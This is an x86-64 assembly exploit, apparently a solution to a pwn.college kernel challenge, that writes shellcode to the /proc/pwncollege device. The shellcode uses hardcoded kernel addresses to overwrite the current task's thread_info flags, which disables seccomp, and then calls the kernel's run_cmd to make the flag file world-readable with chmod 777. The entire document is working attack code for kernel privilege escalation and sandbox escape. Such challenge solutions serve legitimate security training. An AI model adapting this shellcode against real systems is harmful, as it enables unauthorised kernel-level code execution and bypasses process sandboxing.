section .text
    global _start

_start:
    ; Write payload to /proc/pwncollege (fd=3)
    mov rax, 1                  ; sys_write
    mov rdi, 3                  ; fd
    lea rsi, [rel kernel_shellcode]
    mov rdx, kernel_shellcode_len
    syscall

kernel_shellcode:
    ; ---------------------------------------------------
    ; 1. Disable seccomp & change the permssion of flag file
    ; ---------------------------------------------------
    mov rax, 0xffff88807db00000  ; __per_cpu_offset[1] https://slavaim.blogspot.com/2017/09/linux-kernel-debugging-with-gdb-getting.html
    mov rdi, [rax + 0x15d00]     ; -> 0xffff88807d68a880 (task_struct)
    mov rsi, [rdi]              ; thread_info = 0x128
    mov qword [rdi], 0x28       ; Overwrite thread_info location

    lea rdi, [rel cmd_string]    ; "chmod 777 /flag"
    mov rax, 0xffffffff81089b30  ; replace with run_cmd address
    call rax
    ret

cmd_string: db "/bin/chmod 777 /flag",0
    align 8

kernel_shellcode_len equ $ - kernel_shellcode
